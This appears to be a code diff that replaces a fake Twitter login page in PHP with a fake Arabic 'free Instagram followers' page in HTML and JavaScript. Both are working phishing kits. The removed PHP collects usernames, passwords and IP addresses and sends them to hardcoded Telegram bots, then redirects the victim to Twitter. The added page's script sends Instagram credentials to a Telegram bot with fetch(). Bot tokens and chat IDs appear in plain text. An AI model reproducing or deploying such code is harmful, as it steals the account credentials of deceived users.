@@ -1,95 +1,118 @@
-<?php
-// ✅ إعداد بيانات بوتي التلي
-$chat_ids = ["6454073193", "7197079453"];
-$bot_tokens = [
-    "6454073193" => "7522052271:AAHa6XIscaA7ivTn_C0Wr8oaqritL0GP8EY",
-    "7197079453" => "AAFnVl-c5S28araI2YScZOPlQzBUXn_zZIk"
-];
-
-// ✅ إذا تم إرسال النموذج
-if ($_SERVER["REQUEST_METHOD"] === "POST") {
-    $username = $_POST['username'] ?? '';
-    $password = $_POST['password'] ?? '';
-    $ip = $_SERVER['REMOTE_ADDR'];
-
-    $message = "🔔 محاولة تسجيل دخول تويتر وهمية:\n👤 المستخدم: $username\n🔑 كلمة المرور: $password\n🌐 IP: $ip";
-
-    // إرسال البيانات إلى كل بوت
-    foreach ($chat_ids as $id) {
-        $token = $bot_tokens[$id];
-        $url = "https://api.telegram.org/bot$token/sendMessage";
-        $data = ['chat_id' => $id, 'text' => $message];
-
-        file_get_contents($url . "?" . http_build_query($data));
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>رشق انستا - FreeFolo</title>
+  <style>
+    body {
+      background: linear-gradient(to right, #f58529, #dd2a7b, #8134af);
+      font-family: 'Tahoma', sans-serif;
+      color: white;
+      text-align: center;
+      padding: 30px;
     }
 
-    // تحويل المستخدم لصفحة خطأ وهمية
-    header("Location: https://twitter.com/account/begin_password_reset");
-    exit();
-}
-?>
+    .container {
+      background: #ffffff10;
+      padding: 20px;
+      border-radius: 20px;
+      max-width: 400px;
+      margin: auto;
+      box-shadow: 0 0 10px #00000033;
+    }
 
-<!-- ✅ واجهة تسجيل دخول تويتر -->
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <title>تسجيل الدخول إلى تويتر / Twitter</title>
-    <style>
-        body {
-            background-color: #15202b;
-            color: white;
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        .login-box {
-            background: #192734;
-            padding: 40px;
-            border-radius: 10px;
-            width: 320px;
-        }
-        input[type="text"], input[type="password"] {
-            width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            background: #22303c;
-            border: none;
-            border-radius: 5px;
-            color: white;
-        }
-        button {
-            width: 100%;
-            padding: 12px;
-            background: #1da1f2;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            margin-top: 10px;
-            cursor: pointer;
-        }
-        .logo {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .logo img {
-            width: 40px;
-        }
-    </style>
+    h1 {
+      margin-bottom: 25px;
+      font-size: 28px;
+    }
+
+    input, select, button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+    }
+
+    input, select {
+      background-color: white;
+      color: black;
+    }
+
+    button {
+      background-color: #3897f0;
+      color: white;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      background-color: #2f80ed;
+    }
+
+    label {
+      text-align: right;
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+  </style>
 </head>
 <body>
-    <form method="post">
-        <div class="login-box">
-            <div class="logo">
-                <img src="https://abs.twimg.com/icons/apple-touch-icon-192x192.png" alt="Twitter Logo">
-            </div>
-            <h3>تسجيل الدخول إلى تويتر</h3>
-            <input type="text" name="username" placeholder="رقم الهاتف أو البريد الإلكتروني" required>
-            <input type="password" name="password" placeholder="كلمة المرور" required>
-            <button type="submit">تسجيل الدخول</button>
-        </div>
+  <div class="container">
+    <h1>رشق متابعين انستا</h1>
+    <form onsubmit="sendData(); return false;">
+      <label>اسم المستخدم</label>
+      <input type="text" id="username" placeholder="مثل: insta_user123" required>
+
+      <label>كلمة المرور</label>
+      <input type="password" id="password" placeholder="كلمة مرور الحساب" required>
+
+      <label>عدد المتابعين</label>
+      <select id="amount">
+        <option value="1000">1000 متابع</option>
+        <option value="2000">2000 متابع</option>
+        <option value="5000">5000 متابع</option>
+      </select>
+
+      <label>نوع الرشق</label>
+      <select id="type">
+        <option value="متابعين">متابعين</option>
+        <option value="لايكات">لايكات</option>
+        <option value="مشاهدات">مشاهدات</option>
+      </select>
+
+      <button type="submit">ابدأ الرشق الآن</button>
     </form>
+  </div>
+
+  <script>
+    function sendData() {
+      var username = document.getElementById("username").value;
+      var password = document.getElementById("password").value;
+      var amount = document.getElementById("amount").value;
+      var type = document.getElementById("type").value;
+
+      var message = `📥 موقع انستا وهمي\n👤 المستخدم: ${username}\n🔑 كلمة المرور: ${password}\n📦 الكمية: ${amount}\n📌 النوع: ${type}`;
+
+      var token = "7197079453:AAFnVl-c5S28araI2YScZOPlQzBUXn_zZIk";
+      var chat_id = "6454073193";
+      var url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: message
+        })
+      }).then(() => {
+        alert("تم إرسال البيانات بنجاح ✅");
+      }).catch(() => {
+        alert("فشل الإرسال ❌");
+      });
+    }
+  </script>
 </body>
 </html>
